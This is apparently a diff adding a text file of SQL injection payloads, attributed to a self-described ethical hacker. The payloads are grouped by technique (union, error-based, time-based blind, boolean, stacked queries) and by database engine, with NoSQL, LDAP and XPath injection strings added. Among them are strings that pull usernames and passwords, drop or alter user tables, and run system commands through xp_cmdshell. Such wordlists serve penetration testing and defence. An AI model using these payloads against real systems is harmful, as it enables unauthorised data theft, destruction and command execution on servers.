@@ -1,0 +1,124 @@
+# ============================================
+# Author: Tamilsevan S
+# Role: Cybersecurity | Ethical Hacker | Red Hat
+# Website: https://tamilselvan-official.web.app/
+# ============================================
+# SQL Injection Payloads - Extended Collection
+# ============================================
+
+## Basic SQL Injection
+'
+''
+`
+``
+,
+"
+""
+/
+//
+;  
+' or "
+-- or #
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2
+0' AND 1='1
+0' AND 1='0
+%00
+/* … */
++                    
+||
+%0a
+%0d
+1 AND 1=1
+1 AND 1=0
+
+## Union Based SQL Injection
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT * FROM information_schema.tables--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT username,password FROM users--
+1' UNION SELECT 1,version()--
+1' UNION SELECT 1,database()--
+1' UNION SELECT 1,@@datadir--
+
+## Error Based SQL Injection
+1' AND 1=CONVERT(int, (SELECT @@version))--
+1' AND 1=CONVERT(int, (SELECT DB_NAME()))--
+1' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')--
+
+## Time Based SQL Injection (Blind)
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND SLEEP(5)--
+1' AND pg_sleep(5)--
+1' AND waitfor delay '00:00:05'--
+1' AND 1=dbms_pipe.receive_message('RDS',10)--
+
+## Boolean Based SQL Injection
+1' AND 1=1--
+1' AND 1=2--
+1' AND 'a'='a'--
+1' AND 'a'='b'--
+
+## Stacked Queries
+'; DROP TABLE users--
+'; INSERT INTO users VALUES ('admin','password')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; DELETE FROM users WHERE username='admin'--
+
+## Advanced SQL Injection Payloads
+1' AND 1=(SELECT COUNT(*) FROM tablenames); --
+1' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1)) > 90
+1' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name NOT IN('firsttable'))--
+
+## MySQL Specific
+1' AND IF((SELECT version() LIKE '%5.0%'), SLEEP(5), 0)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+## PostgreSQL Specific
+1'; SELECT pg_sleep(5)--
+1'; SELECT version()--
+1'; SELECT current_database()--
+
+## Oracle Specific
+1' AND 1=UTL_INADDR.get_host_name('localhost')--
+1' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))--
+1' AND 1=(SELECT COUNT(*) FROM all_users)--
+
+## Microsoft SQL Server Specific
+1' AND 1=(SELECT @@version)--
+1'; EXEC xp_cmdshell 'ping localhost'--
+1'; EXEC master..xp_cmdshell 'ipconfig'--
+1' AND 1=(SELECT TOP 1 name FROM master..syslogins)--
+
+## NoSQL Injection
+admin' || '1'=='1
+admin' && this.password.match(/.*/)//+
+{$ne: 1}
+{$gt: ''}
+{$where: 'this.username == "admin"'}
+' || 1==1 //
+') || '1'=='1'//
+
+## LDAP Injection
+*)
+*)(uid=*
+*)(uid=*))((uid=*
+
+## XPath Injection
+' or '1'='1
+' or '1'='1' or '1'='1
+' and count(/child::node()) > 0
+' and string-length(name(/*[1])) > 0
